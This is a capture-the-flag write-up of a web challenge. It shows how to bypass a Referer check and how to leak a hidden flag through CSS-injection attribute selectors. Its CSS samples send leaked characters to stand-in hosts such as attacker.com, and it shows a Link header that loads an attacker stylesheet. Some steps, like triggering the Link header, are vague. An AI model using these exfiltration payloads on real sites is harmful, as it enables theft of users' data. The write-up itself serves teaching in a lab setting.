# tes — ImaginaryCTF Writeup

**Challenge:** tes  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 75 pts  
**Flag:** `ictf{firefox_yupeee!}`

---

## Description

> wow so original another note taking web challenge

**Site:** `http://155.248.210.243:42280/`

---

## Background Knowledge (Read This First!)

### What is a Referrer Check?

Some web apps check the `Referer` HTTP header to ensure requests come from a trusted page. The challenge uses this as a security check.

### What is `<meta name="referrer" content="never">`?

This HTML meta tag tells the browser to **never send the Referer header** when navigating from that page. It bypasses referrer-based security checks entirely.

### What is CSS Injection?

**CSS Injection** is an attack where you inject CSS into a page to exfiltrate data. For example:

```css
input[value^="a"] { background: url(https://attacker.com/?c=a) }
input[value^="b"] { background: url(https://attacker.com/?c=b) }
```

By checking which URL your server receives, you learn the first character of the input value. Repeat for each character to extract the full value.

### What is the `link` Header Trick?

Firefox supports a `Link` HTTP header that can load CSS stylesheets:

```
Link: <https://attacker.com/evil.css>; rel=stylesheet
```

By making the app load your CSS, you can perform CSS injection even without an XSS vulnerability.

---

## Solution

### Step 1 — Bypass the referrer check

Create an HTML page with:

```html
<meta name="referrer" content="never">
<script>
  // Navigate to the challenge site — no Referer header will be sent
  window.location = "http://155.248.210.243:42280/flag";
</script>
```

### Step 2 — Load arbitrary CSS via Firefox Link header

Host a CSS file that extracts the flag character by character:

```css
div[class^="flag-a"] ~ * { background: url(https://your-server.com/?c=a) }
div[class^="flag-b"] ~ * { background: url(https://your-server.com/?c=b) }
/* ... repeat for all characters */
```

Then trigger the Link header to load it.

### Step 3 — Collect characters and assemble flag

```
ictf{firefox_yupeee!}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| HTML meta referrer tag | Bypass the referrer security check | ⭐⭐ Medium |
| CSS injection | Extract flag characters via side channel | ⭐⭐⭐ Hard |
| Firefox Link header | Load arbitrary CSS without XSS | ⭐⭐⭐ Hard |

---

## Key Takeaways

- `<meta name="referrer" content="never">` completely disables the Referer header — bypassing referrer checks
- Firefox's `Link` header support allows loading stylesheets from any source
- CSS injection via attribute selectors is a powerful data exfiltration technique
- This attack is Firefox-specific — Chrome handles the Link header differently
